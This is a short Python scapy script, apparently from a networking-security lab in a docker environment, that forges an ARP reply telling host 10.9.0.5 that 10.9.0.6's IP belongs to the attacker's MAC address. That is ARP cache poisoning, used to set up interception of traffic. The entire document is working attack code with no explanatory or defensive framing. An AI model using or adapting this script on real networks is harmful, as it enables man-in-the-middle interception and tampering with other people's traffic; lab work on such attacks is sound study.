#!/usr/bin/env python3
from scapy.all import *
import time

m_mac_address = '02:42:86:be:9d:85'
m_ip_address = '10.9.0.1'
b_mac_address = '02:42:0a:09:00:06'
b_ip_address = '10.9.0.6'
a_mac_address = '02:42:0a:09:00:05'
a_ip_address = '10.9.0.5'

E = Ether(src=m_mac_address, dst=a_mac_address)
A = ARP(psrc=b_ip_address, pdst=a_ip_address, hwsrc=m_mac_address, hwdst=a_mac_address)
A.op = 2 # 1 for ARP request; 2 for ARP reply

pkt = E/A
sendp(pkt, verbose=True, iface='br-49c8795efc97')


